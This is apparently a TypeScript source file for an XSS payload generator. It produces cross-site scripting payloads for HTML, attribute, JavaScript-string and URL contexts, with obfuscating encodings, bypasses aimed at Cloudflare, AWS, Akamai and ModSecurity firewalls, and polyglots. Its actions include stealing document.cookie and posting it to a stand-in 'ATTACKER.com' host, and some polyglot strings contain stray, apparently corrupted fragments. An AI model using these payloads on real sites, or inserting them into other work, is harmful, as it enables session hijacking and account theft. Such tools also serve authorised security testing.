// ── Types ──────────────────────────────────────────────────────────

export type InjectionContext =
  | "html-body"
  | "attribute-double"
  | "attribute-single"
  | "attribute-unquoted"
  | "js-string-single"
  | "js-string-double"
  | "js-template"
  | "url"
  | "event-handler";

export type XssAction =
  | "alert"
  | "console"
  | "cookie"
  | "redirect"
  | "fetch"
  | "custom";

export type EncodingType =
  | "none"
  | "url"
  | "double-url"
  | "base64"
  | "html-entities"
  | "hex"
  | "fromcharcode"
  | "unicode";

export type WafProfile =
  | "none"
  | "cloudflare"
  | "aws-waf"
  | "akamai"
  | "modsecurity";

export interface XssPayload {
  name: string;
  payload: string;
  context: InjectionContext;
  description: string;
  tags: string[];
  requiresInteraction: boolean;
}

export interface XssConfig {
  context: InjectionContext;
  action: XssAction;
  customJs: string;
  encoding: EncodingType;
  wafProfile: WafProfile;
  blockedChars: string;
}

// ── Constants ─────────────────────────────────────────────────────

export const CONTEXTS: { id: InjectionContext; name: string; description: string; example: string }[] = [
  { id: "html-body", name: "HTML Body", description: "Injecting directly into the HTML document body.", example: "<div>INJECT_HERE</div>" },
  { id: "attribute-double", name: "Attribute (double-quoted)", description: "Inside a double-quoted HTML attribute.", example: '<input value="INJECT_HERE">' },
  { id: "attribute-single", name: "Attribute (single-quoted)", description: "Inside a single-quoted HTML attribute.", example: "<input value='INJECT_HERE'>" },
  { id: "attribute-unquoted", name: "Attribute (unquoted)", description: "Inside an unquoted HTML attribute value.", example: "<input value=INJECT_HERE>" },
  { id: "js-string-single", name: "JS String (single-quoted)", description: "Inside a single-quoted JavaScript string.", example: "var x = 'INJECT_HERE';" },
  { id: "js-string-double", name: "JS String (double-quoted)", description: "Inside a double-quoted JavaScript string.", example: 'var x = "INJECT_HERE";' },
  { id: "js-template", name: "JS Template Literal", description: "Inside a JavaScript template literal.", example: "var x = `INJECT_HERE`;" },
  { id: "url", name: "URL / href", description: "Inside a URL attribute (href, src, action).", example: '<a href="INJECT_HERE">' },
  { id: "event-handler", name: "Event Handler", description: "Inside an inline event handler attribute.", example: '<div onclick="INJECT_HERE">' },
];

export const ACTIONS: { id: XssAction; name: string; description: string }[] = [
  { id: "alert", name: "Alert Box", description: "Show alert(1) — proof of concept" },
  { id: "console", name: "Console Log", description: "Log to console — stealthy PoC" },
  { id: "cookie", name: "Cookie Theft", description: "Exfiltrate document.cookie" },
  { id: "redirect", name: "Redirect", description: "Redirect user to attacker URL" },
  { id: "fetch", name: "Fetch/XHR", description: "Send data via fetch() request" },
  { id: "custom", name: "Custom JS", description: "Your own JavaScript code" },
];

export const ENCODINGS: { id: EncodingType; name: string; description: string }[] = [
  { id: "none", name: "None", description: "Raw payload, no encoding" },
  { id: "url", name: "URL Encode", description: "Percent-encode special characters" },
  { id: "double-url", name: "Double URL Encode", description: "Apply URL encoding twice" },
  { id: "html-entities", name: "HTML Entities", description: "Encode as HTML character references" },
  { id: "hex", name: "Hex (\\x)", description: "JavaScript hex escape sequences" },
  { id: "unicode", name: "Unicode (\\u)", description: "JavaScript unicode escape sequences" },
  { id: "fromcharcode", name: "String.fromCharCode", description: "Build string from char codes" },
  { id: "base64", name: "Base64 (atob)", description: "Base64 encode with atob() wrapper" },
];

export const WAF_PROFILES: { id: WafProfile; name: string; description: string }[] = [
  { id: "none", name: "No WAF", description: "Standard payloads without WAF considerations" },
  { id: "cloudflare", name: "Cloudflare", description: "Bypass techniques for Cloudflare WAF" },
  { id: "aws-waf", name: "AWS WAF", description: "Bypass techniques for AWS WAF rules" },
  { id: "akamai", name: "Akamai", description: "Bypass techniques for Akamai Kona WAF" },
  { id: "modsecurity", name: "ModSecurity CRS", description: "Bypass techniques for ModSecurity OWASP CRS" },
];

// ── Payload generation helpers ────────────────────────────────────

function getActionJs(action: XssAction, customJs: string): string {
  switch (action) {
    case "alert":
      return "alert(1)";
    case "console":
      return "console.log(1)";
    case "cookie":
      return "fetch('https://ATTACKER.com/?c='+document.cookie)";
    case "redirect":
      return "window.location='https://ATTACKER.com/'";
    case "fetch":
      return "fetch('https://ATTACKER.com/',{method:'POST',body:document.cookie})";
    case "custom":
      return customJs || "alert(1)";
  }
}

// ── Encoding functions ────────────────────────────────────────────

export function applyEncoding(input: string, encoding: EncodingType): string {
  switch (encoding) {
    case "none":
      return input;
    case "url":
      return urlEncode(input);
    case "double-url":
      return urlEncode(urlEncode(input));
    case "html-entities":
      return htmlEntityEncode(input);
    case "hex":
      return hexEncode(input);
    case "unicode":
      return unicodeEncode(input);
    case "fromcharcode":
      return fromCharCodeEncode(input);
    case "base64":
      return base64Encode(input);
  }
}

function urlEncode(s: string): string {
  return [...s].map((c) => "%" + c.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase()).join("");
}

function htmlEntityEncode(s: string): string {
  return [...s].map((c) => "&#x" + c.charCodeAt(0).toString(16) + ";").join("");
}

function hexEncode(s: string): string {
  return [...s].map((c) => "\\x" + c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
}

function unicodeEncode(s: string): string {
  return [...s].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("");
}

function fromCharCodeEncode(s: string): string {
  const codes = [...s].map((c) => c.charCodeAt(0)).join(",");
  return `String.fromCharCode(${codes})`;
}

function base64Encode(s: string): string {
  try {
    const encoded = btoa(s);
    return `atob('${encoded}')`;
  } catch {
    return s;
  }
}

// ── Blocked character filter ──────────────────────────────────────

function isBlocked(payload: string, blockedChars: string): boolean {
  if (!blockedChars.trim()) return false;
  const blocked = blockedChars.split("").filter((c) => c.trim());
  return blocked.some((c) => payload.includes(c));
}

// ── Context-aware payload generators ──────────────────────────────

function generateHtmlBodyPayloads(js: string): XssPayload[] {
  return [
    { name: "Script tag", payload: `<script>${js}</script>`, context: "html-body", description: "Basic script tag injection", tags: ["script"], requiresInteraction: false },
    { name: "Img onerror", payload: `<img src=x onerror=${js}>`, context: "html-body", description: "Image tag with onerror event", tags: ["img", "onerror"], requiresInteraction: false },
    { name: "Svg onload", payload: `<svg onload=${js}>`, context: "html-body", description: "SVG with onload event", tags: ["svg", "onload"], requiresInteraction: false },
    { name: "Svg/animate", payload: `<svg><animate onbegin=${js} attributeName=x dur=1s>`, context: "html-body", description: "SVG animate element with onbegin", tags: ["svg", "animate", "onbegin"], requiresInteraction: false },
    { name: "Body onload", payload: `<body onload=${js}>`, context: "html-body", description: "Body tag with onload — replaces existing body", tags: ["body", "onload"], requiresInteraction: false },
    { name: "Details/summary", payload: `<details open ontoggle=${js}><summary>X</summary></details>`, context: "html-body", description: "Details element with ontoggle event", tags: ["details", "ontoggle"], requiresInteraction: false },
    { name: "Iframe srcdoc", payload: `<iframe srcdoc="<script>${js}</script>">`, context: "html-body", description: "Iframe with script in srcdoc", tags: ["iframe", "srcdoc"], requiresInteraction: false },
    { name: "Input onfocus (autofocus)", payload: `<input autofocus onfocus=${js}>`, context: "html-body", description: "Auto-focused input triggers onfocus", tags: ["input", "onfocus"], requiresInteraction: false },
    { name: "Marquee onstart", payload: `<marquee onstart=${js}>`, context: "html-body", description: "Marquee tag with onstart event", tags: ["marquee", "onstart"], requiresInteraction: false },
    { name: "Video onerror", payload: `<video><source onerror=${js}>`, context: "html-body", description: "Video source with onerror", tags: ["video", "source", "onerror"], requiresInteraction: false },
    { name: "Object onerror", payload: `<object data=x onerror=${js}>`, context: "html-body", description: "Object tag with invalid data triggers onerror", tags: ["object", "onerror"], requiresInteraction: false },
    { name: "Math tag (MathML)", payload: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=${js}>`, context: "html-body", description: "MathML-based injection using parser quirks", tags: ["math", "img", "onerror"], requiresInteraction: false },
    { name: "Anchor onclick", payload: `<a href=# onclick=${js}>click</a>`, context: "html-body", description: "Anchor tag — requires user click", tags: ["a", "onclick"], requiresInteraction: true },
    { name: "Div onmouseover", payload: `<div onmouseover=${js} style="position:fixed;top:0;left:0;width:100%;height:100%">`, context: "html-body", description: "Full-screen div capturing mouse movement", tags: ["div", "onmouseover"], requiresInteraction: true },
  ];
}

function generateAttributeDoublePayloads(js: string): XssPayload[] {
  return [
    { name: 'Break out + onerror', payload: `" onerror=${js} "`, context: "attribute-double", description: "Break double-quote attribute, add event handler", tags: ["onerror"], requiresInteraction: false },
    { name: 'Break out + onfocus', payload: `" autofocus onfocus=${js} "`, context: "attribute-double", description: "Break attribute, add autofocus + onfocus", tags: ["onfocus"], requiresInteraction: false },
    { name: 'Break out + onmouseover', payload: `" onmouseover=${js} "`, context: "attribute-double", description: "Break attribute, add mouseover handler", tags: ["onmouseover"], requiresInteraction: true },
    { name: 'Close tag + script', payload: `"><script>${js}</script>`, context: "attribute-double", description: "Close attribute and tag, inject script", tags: ["script"], requiresInteraction: false },
    { name: 'Close tag + img', payload: `"><img src=x onerror=${js}>`, context: "attribute-double", description: "Close attribute and tag, inject img", tags: ["img", "onerror"], requiresInteraction: false },
    { name: 'Close tag + svg', payload: `"><svg onload=${js}>`, context: "attribute-double", description: "Close attribute and tag, inject SVG", tags: ["svg", "onload"], requiresInteraction: false },
  ];
}

function generateAttributeSinglePayloads(js: string): XssPayload[] {
  return [
    { name: "Break out + onerror", payload: `' onerror=${js} '`, context: "attribute-single", description: "Break single-quote attribute, add event handler", tags: ["onerror"], requiresInteraction: false },
    { name: "Break out + onfocus", payload: `' autofocus onfocus=${js} '`, context: "attribute-single", description: "Break attribute, add autofocus + onfocus", tags: ["onfocus"], requiresInteraction: false },
    { name: "Close tag + script", payload: `'><script>${js}</script>`, context: "attribute-single", description: "Close attribute and tag, inject script", tags: ["script"], requiresInteraction: false },
    { name: "Close tag + img", payload: `'><img src=x onerror=${js}>`, context: "attribute-single", description: "Close attribute and tag, inject img", tags: ["img", "onerror"], requiresInteraction: false },
    { name: "Close tag + svg", payload: `'><svg onload=${js}>`, context: "attribute-single", description: "Close attribute and tag, inject SVG", tags: ["svg", "onload"], requiresInteraction: false },
  ];
}

function generateAttributeUnquotedPayloads(js: string): XssPayload[] {
  return [
    { name: "Space + onerror", payload: ` onerror=${js} `, context: "attribute-unquoted", description: "Add space to break value, inject event handler", tags: ["onerror"], requiresInteraction: false },
    { name: "Space + onfocus", payload: ` autofocus onfocus=${js} `, context: "attribute-unquoted", description: "Add autofocus + onfocus", tags: ["onfocus"], requiresInteraction: false },
    { name: "Close tag + script", payload: `><script>${js}</script>`, context: "attribute-unquoted", description: "Close tag, inject script", tags: ["script"], requiresInteraction: false },
    { name: "Close tag + img", payload: `><img src=x onerror=${js}>`, context: "attribute-unquoted", description: "Close tag, inject img", tags: ["img", "onerror"], requiresInteraction: false },
  ];
}

function generateJsStringSinglePayloads(js: string): XssPayload[] {
  return [
    { name: "Break string + execute", payload: `';${js};//`, context: "js-string-single", description: "Break out of single-quoted string, execute JS, comment rest", tags: ["js-break"], requiresInteraction: false },
    { name: "Break + new function", payload: `';${js};var a='`, context: "js-string-single", description: "Break string, execute, restore quote balance", tags: ["js-break"], requiresInteraction: false },
    { name: "Close script + new script", payload: `</script><script>${js}</script>`, context: "js-string-single", description: "Close script tag, open new script block", tags: ["script"], requiresInteraction: false },
    { name: "Break + constructor", payload: `'-[]["filter"]["constructor"](${js})()-'`, context: "js-string-single", description: "Use constructor chain to execute code", tags: ["js-constructor"], requiresInteraction: false },
  ];
}

function generateJsStringDoublePayloads(js: string): XssPayload[] {
  return [
    { name: "Break string + execute", payload: `";${js};//`, context: "js-string-double", description: "Break out of double-quoted string, execute JS, comment rest", tags: ["js-break"], requiresInteraction: false },
    { name: "Break + new function", payload: `";${js};var a="`, context: "js-string-double", description: "Break string, execute, restore quote balance", tags: ["js-break"], requiresInteraction: false },
    { name: "Close script + new script", payload: `</script><script>${js}</script>`, context: "js-string-double", description: "Close script tag, open new script block", tags: ["script"], requiresInteraction: false },
  ];
}

function generateJsTemplatePayloads(js: string): XssPayload[] {
  return [
    { name: "Template expression", payload: `\${${js}}`, context: "js-template", description: "Inject into template literal expression", tags: ["template-literal"], requiresInteraction: false },
    { name: "Break + execute", payload: `\`;${js};//`, context: "js-template", description: "Break backtick string, execute JS", tags: ["js-break"], requiresInteraction: false },
    { name: "Close script + new script", payload: `</script><script>${js}</script>`, context: "js-template", description: "Close script tag, open new script block", tags: ["script"], requiresInteraction: false },
  ];
}

function generateUrlPayloads(js: string): XssPayload[] {
  return [
    { name: "javascript: protocol", payload: `javascript:${js}`, context: "url", description: "JavaScript pseudo-protocol in URL", tags: ["javascript-protocol"], requiresInteraction: true },
    { name: "javascript: with entities", payload: `javascript:${htmlEntityEncode(js)}`, context: "url", description: "JavaScript protocol with HTML entity encoded payload", tags: ["javascript-protocol", "html-entities"], requiresInteraction: true },
    { name: "javascript: with tab", payload: `java\tscript:${js}`, context: "url", description: "Tab character inside protocol name", tags: ["javascript-protocol", "obfuscation"], requiresInteraction: true },
    { name: "javascript: with newline", payload: `java\nscript:${js}`, context: "url", description: "Newline inside protocol name", tags: ["javascript-protocol", "obfuscation"], requiresInteraction: true },
    { name: "data: text/html", payload: `data:text/html,<script>${js}</script>`, context: "url", description: "Data URI with HTML content", tags: ["data-uri"], requiresInteraction: true },
    { name: "data: base64", payload: `data:text/html;base64,${safeBase64(`<script>${js}</script>`)}`, context: "url", description: "Base64-encoded data URI", tags: ["data-uri", "base64"], requiresInteraction: true },
  ];
}

function generateEventHandlerPayloads(js: string): XssPayload[] {
  return [
    { name: "Direct execution", payload: js, context: "event-handler", description: "Direct JS execution in event handler context", tags: ["direct"], requiresInteraction: false },
    { name: "Eval + string", payload: `eval('${js.replace(/'/g, "\\'")}')`, context: "event-handler", description: "Eval wrapper for complex payloads", tags: ["eval"], requiresInteraction: false },
    { name: "Function constructor", payload: `Function('${js.replace(/'/g, "\\'")}')()`, context: "event-handler", description: "Function constructor execution", tags: ["function-constructor"], requiresInteraction: false },
    { name: "setTimeout", payload: `setTimeout('${js.replace(/'/g, "\\'")}')`, context: "event-handler", description: "setTimeout with string argument", tags: ["settimeout"], requiresInteraction: false },
  ];
}

function safeBase64(s: string): string {
  try {
    return btoa(s);
  } catch {
    return "";
  }
}

// ── WAF bypass payload generators ─────────────────────────────────

function generateWafBypassPayloads(js: string, waf: WafProfile): XssPayload[] {
  if (waf === "none") return [];

  const payloads: XssPayload[] = [];

  // Common across WAFs
  const commonPayloads: XssPayload[] = [
    { name: "Case variation", payload: `<ScRiPt>${js}</sCrIpT>`, context: "html-body", description: "Mixed case tag to bypass case-sensitive filters", tags: ["case-bypass"], requiresInteraction: false },
    { name: "Null byte insertion", payload: `<scr\x00ipt>${js}</script>`, context: "html-body", description: "Null byte inside tag name", tags: ["null-byte"], requiresInteraction: false },
    { name: "Double tag", payload: `<scr<script>ipt>${js}</script>`, context: "html-body", description: "Nested tag to survive single-pass strip", tags: ["double-tag"], requiresInteraction: false },
    { name: "SVG + set", payload: `<svg><set onbegin=${js} attributename=x>`, context: "html-body", description: "SVG set element with onbegin — less commonly filtered", tags: ["svg", "set", "onbegin"], requiresInteraction: false },
    { name: "Custom element", payload: `<x-tag onclick=${js}>click</x-tag>`, context: "html-body", description: "Custom HTML element — unusual tag name evades filters", tags: ["custom-element", "onclick"], requiresInteraction: true },
  ];

  payloads.push(...commonPayloads);

  switch (waf) {
    case "cloudflare":
      payloads.push(
        { name: "CF: Img with newline", payload: `<img\nsrc=x\nonerror=${js}>`, context: "html-body", description: "Newlines between attributes to bypass Cloudflare regex", tags: ["cloudflare", "newline"], requiresInteraction: false },
        { name: "CF: Details ontoggle", payload: `<details open\nontoggle=${js}>`, context: "html-body", description: "Details element — less filtered by Cloudflare", tags: ["cloudflare", "details", "ontoggle"], requiresInteraction: false },
        { name: "CF: SVG animate", payload: `<svg><animate onbegin=${js} attributeName=x dur=1s>`, context: "html-body", description: "SVG animate — often bypasses Cloudflare rules", tags: ["cloudflare", "svg", "animate"], requiresInteraction: false },
        { name: "CF: Input onfocus tabindex", payload: `<input onfocus=${js} autofocus tabindex=1>`, context: "html-body", description: "Autofocus input with tabindex", tags: ["cloudflare", "input", "onfocus"], requiresInteraction: false },
      );
      break;
    case "aws-waf":
      payloads.push(
        { name: "AWS: Img with tab", payload: `<img\tsrc=x\tonerror=${js}>`, context: "html-body", description: "Tab characters between attributes", tags: ["aws-waf", "tab"], requiresInteraction: false },
        { name: "AWS: SVG onload", payload: `<svg/onload=${js}>`, context: "html-body", description: "Forward slash instead of space before attribute", tags: ["aws-waf", "svg", "onload"], requiresInteraction: false },
        { name: "AWS: Body onpageshow", payload: `<body onpageshow=${js}>`, context: "html-body", description: "onpageshow event — less commonly filtered", tags: ["aws-waf", "body", "onpageshow"], requiresInteraction: false },
        { name: "AWS: Select onfocus", payload: `<select autofocus onfocus=${js}>`, context: "html-body", description: "Select element with autofocus", tags: ["aws-waf", "select", "onfocus"], requiresInteraction: false },
      );
      break;
    case "akamai":
      payloads.push(
        { name: "Akamai: Object tag", payload: `<object data="javascript:${js}">`, context: "html-body", description: "Object tag with javascript: data URL", tags: ["akamai", "object", "javascript-protocol"], requiresInteraction: false },
        { name: "Akamai: Math injection", payload: `<math><brute href="javascript:${js}">click`, context: "html-body", description: "MathML with href — less commonly blocked", tags: ["akamai", "math"], requiresInteraction: true },
        { name: "Akamai: Marquee onfinish", payload: `<marquee behavior=alternate onfinish=${js}>x</marquee>`, context: "html-body", description: "Marquee with onfinish event", tags: ["akamai", "marquee", "onfinish"], requiresInteraction: false },
        { name: "Akamai: Div contenteditable", payload: `<div contenteditable onblur=${js} tabindex=1>focus me</div>`, context: "html-body", description: "Editable div with onblur", tags: ["akamai", "div", "onblur"], requiresInteraction: true },
      );
      break;
    case "modsecurity":
      payloads.push(
        { name: "ModSec: SVG with entity", payload: `<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`, context: "html-body", description: "HTML entity-encoded JS inside event handler", tags: ["modsecurity", "svg", "html-entities"], requiresInteraction: false },
        { name: "ModSec: Backtick alert", payload: "<script>alert`1`</script>", context: "html-body", description: "Tagged template literal — no parentheses", tags: ["modsecurity", "script", "template-literal"], requiresInteraction: false },
        { name: "ModSec: Img onerror throw", payload: `<img src=x onerror="throw onerror=alert,1">`, context: "html-body", description: "Throw + onerror reassignment", tags: ["modsecurity", "img", "throw"], requiresInteraction: false },
        { name: "ModSec: No parens", payload: `<img src=x onerror=alert\`1\`>`, context: "html-body", description: "Backtick invocation — avoids parentheses filter", tags: ["modsecurity", "img", "no-parens"], requiresInteraction: false },
      );
      break;
  }

  return payloads;
}

// ── Polyglot payloads ─────────────────────────────────────────────

export function getPolyglotPayloads(js: string): XssPayload[] {
  return [
    {
      name: "Classic polyglot",
      payload: `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */oNcliCk=alert(1) )//%%0telerik0telerik11telerik/telerik/oNcliCk=alert(1)//><svg/onload=alert(1)>//">'><img/src=x onerror=${js}//>`,
      context: "html-body",
      description: "Multi-context polyglot — works in HTML, attribute, JS string, and URL contexts",
      tags: ["polyglot"],
      requiresInteraction: false,
    },
    {
      name: "0xsobky polyglot",
      payload: `-->'"/></sCript><dEt662662ails%telerik/telerikopen%telerik/telerikontoggle=telerik"(javaScript:${js})">`,
      context: "html-body",
      description: "Simplified polyglot targeting HTML/attribute breakout",
      tags: ["polyglot"],
      requiresInteraction: false,
    },
    {
      name: "Attribute + JS polyglot",
      payload: `'"><img src=x onerror=${js}>//";\n${js};//`,
      context: "html-body",
      description: "Works in both attribute and JavaScript string contexts",
      tags: ["polyglot"],
      requiresInteraction: false,
    },
    {
      name: "Minimal polyglot",
      payload: `'"><svg/onload=${js}>//`,
      context: "html-body",
      description: "Short polyglot for attribute and HTML body contexts",
      tags: ["polyglot"],
      requiresInteraction: false,
    },
  ];
}

// ── Main generator ────────────────────────────────────────────────

export function getDefaultConfig(): XssConfig {
  return {
    context: "html-body",
    action: "alert",
    customJs: "",
    encoding: "none",
    wafProfile: "none",
    blockedChars: "",
  };
}

export function generatePayloads(config: XssConfig): XssPayload[] {
  const js = getActionJs(config.action, config.customJs);
  let payloads: XssPayload[] = [];

  // Generate context-specific payloads
  switch (config.context) {
    case "html-body":
      payloads = generateHtmlBodyPayloads(js);
      break;
    case "attribute-double":
      payloads = generateAttributeDoublePayloads(js);
      break;
    case "attribute-single":
      payloads = generateAttributeSinglePayloads(js);
      break;
    case "attribute-unquoted":
      payloads = generateAttributeUnquotedPayloads(js);
      break;
    case "js-string-single":
      payloads = generateJsStringSinglePayloads(js);
      break;
    case "js-string-double":
      payloads = generateJsStringDoublePayloads(js);
      break;
    case "js-template":
      payloads = generateJsTemplatePayloads(js);
      break;
    case "url":
      payloads = generateUrlPayloads(js);
      break;
    case "event-handler":
      payloads = generateEventHandlerPayloads(js);
      break;
  }

  // Add WAF bypass payloads
  if (config.wafProfile !== "none") {
    payloads.push(...generateWafBypassPayloads(js, config.wafProfile));
  }

  // Apply encoding
  if (config.encoding !== "none") {
    payloads = payloads.map((p) => ({
      ...p,
      payload: applyEncoding(p.payload, config.encoding),
    }));
  }

  // Filter by blocked characters (pre-encoding payloads checked)
  if (config.blockedChars.trim()) {
    const rawPayloads = config.encoding !== "none"
      ? generatePayloadsRaw(config)
      : payloads;

    payloads = payloads.filter((_, i) => {
      const rawPayload = rawPayloads[i]?.payload ?? payloads[i]?.payload;
      return !isBlocked(rawPayload, config.blockedChars);
    });
  }

  return payloads;
}

// Generate raw (unencoded) payloads for blocked char checking
function generatePayloadsRaw(config: XssConfig): XssPayload[] {
  const rawConfig = { ...config, encoding: "none" as const };
  return generatePayloads(rawConfig);
}

// ── Quick reference data ──────────────────────────────────────────

export const QUICK_REFERENCE = [
  { payload: '<script>alert(1)</script>', description: "Basic script injection", context: "HTML Body" },
  { payload: '<img src=x onerror=alert(1)>', description: "Image tag with error handler", context: "HTML Body" },
  { payload: '<svg onload=alert(1)>', description: "SVG with onload event", context: "HTML Body" },
  { payload: '" onfocus=alert(1) autofocus="', description: "Break double-quoted attribute", context: "Attribute" },
  { payload: "';alert(1);//", description: "Break JS single-quoted string", context: "JS String" },
  { payload: "javascript:alert(1)", description: "JavaScript pseudo-protocol", context: "URL/href" },
  { payload: "${alert(1)}", description: "Template literal injection", context: "JS Template" },
  { payload: '<details open ontoggle=alert(1)>', description: "Details with ontoggle (no interaction)", context: "HTML Body" },
];
